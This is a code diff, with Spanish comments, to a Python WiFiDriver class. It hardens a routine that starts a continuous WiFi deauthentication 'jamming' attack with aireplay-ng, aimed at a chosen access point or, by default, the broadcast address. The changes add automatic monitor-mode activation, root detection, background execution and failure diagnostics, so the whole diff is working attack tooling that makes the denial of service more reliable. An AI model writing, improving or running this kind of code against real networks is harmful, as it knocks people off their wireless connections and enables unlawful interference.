@@ -851,19 +851,58 @@ class WiFiDriver:
                 if channel:
                     self.set_channel(channel)
                 
+                # Verificar que estamos en modo monitor
+                if not self.monitor_mode:
+                    print("ERROR: Modo monitor no activo. Activando...")
+                    if not self.set_monitor_mode(True):
+                        print("ERROR: No se pudo activar modo monitor.")
+                        return False
+                
                 # Usar aireplay-ng para deauth attack
-                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                # Nota: Si ya estamos ejecutando con sudo, no necesitamos sudo en el comando
+                import os
+                if os.geteuid() == 0:
+                    # Ya estamos como root, no usar sudo
+                    cmd = ['aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                else:
+                    # Necesitamos sudo
+                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                
+                print(f"Iniciando jamming en {interface}...")
                 
                 # Ejecutar en background
-                self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                try:
+                    self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                except Exception as e:
+                    print(f"ERROR ejecutando aireplay-ng: {e}")
+                    return False
                 
                 # Verificar que inició correctamente
-                time.sleep(0.5)
+                time.sleep(1.0)  # Más tiempo para que inicie
+                
                 if self.jam_process.poll() is not None:
                     # Proceso terminó prematuramente
+                    stdout = self.jam_process.stdout.read().decode('utf-8', errors='ignore') if self.jam_process.stdout else ""
                     stderr = self.jam_process.stderr.read().decode('utf-8', errors='ignore') if self.jam_process.stderr else ""
-                    print(f"ERROR iniciando jamming: {stderr}")
+                    
+                    print(f"ERROR: aireplay-ng terminó inmediatamente.")
+                    if stdout:
+                        print(f"STDOUT: {stdout}")
+                    if stderr:
+                        print(f"STDERR: {stderr}")
+                    
+                    # Diagnóstico adicional
+                    print(f"\nDiagnóstico:")
+                    print(f"  - Interfaz: {interface}")
+                    print(f"  - Modo monitor: {self.monitor_mode}")
+                    print(f"  - Canal actual: {self.current_channel}")
+                    print(f"  - Verifica con: sudo aireplay-ng --test {interface}")
+                    
                     return False
+                
+                # Verificar que el proceso realmente esté corriendo
+                print(f"Jamming iniciado (PID: {self.jam_process.pid})")
+                print(f"Verifica con: ps aux | grep {self.jam_process.pid}")
                 
                 return True
             
